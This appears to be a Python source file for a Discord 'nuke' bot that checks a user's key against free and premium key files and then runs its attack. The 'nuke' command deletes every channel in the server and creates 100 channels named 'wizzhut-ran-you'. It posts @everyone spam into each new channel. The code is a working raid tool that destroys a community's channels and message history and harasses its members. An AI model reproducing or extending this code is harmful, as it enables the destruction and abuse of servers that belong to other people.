import discord
from discord.ext import commands
import threading
import time

token = ""
intents = discord.Intents.all()

koala = commands.Bot(command_prefix="w.", intents=intents)

freeauth = set()
premauth = set()

lock = threading.Lock()

def read_keys_from_file(file_path, auth_set):
    with open(file_path, "r") as file:
        reader = file.read()
        words = reader.split()
        new_keys = set(words)
        with lock:
            if new_keys != auth_set:
                print(f"New keys added: {new_keys - auth_set}")
                auth_set.clear()
                auth_set.update(new_keys)
        return auth_set

def check_file_changes(file_path, auth_set):
    while True:
        auth_set = read_keys_from_file(file_path, auth_set)
        time.sleep(1)

def premfile(file_path, auth_set):
    with open(file_path, "r") as file:
        reader = file.read()
        words = reader.split()
        new_keys = set(words)
        with lock:
            if new_keys != auth_set:
                print(f"New premium keys added: {new_keys - auth_set}")
                auth_set.clear()
                auth_set.update(new_keys)
        return auth_set

def premfileauth(filepath, auth_set):
    while True:
        auth_set = premfile(filepath, auth_set)
        time.sleep(1)

# Start threads
file_check_thread = threading.Thread(target=check_file_changes, args=("auth\\auth.txt", freeauth))
file_check_thread.start()

prem_file_check_thread = threading.Thread(target=premfileauth, args=("auth\\premium_auth.txt", premauth))
prem_file_check_thread.start()

@koala.command()
async def nuke(ctx, *, auth):
    if auth in freeauth or auth in premauth:
        print(f"{ctx.author.id}")
        try:
            for channel in ctx.guild.channels:
                await channel.delete()
            
            num_channels = 100
            
            for i in range(1, num_channels + 1):
                channel_name = f"wizzhut-ran-you"
                new_channel = await ctx.guild.create_text_channel(channel_name)
                for i in range(2):
                    await new_channel.send("@everyone wizzhut ran you\nfounded by infamous koala :koala: <3")

        except Exception as e:
            await ctx.reply("_ _")
        
    else:
        await ctx.send(":koala: invalid auth")

# Start the bot
koala.run(token)
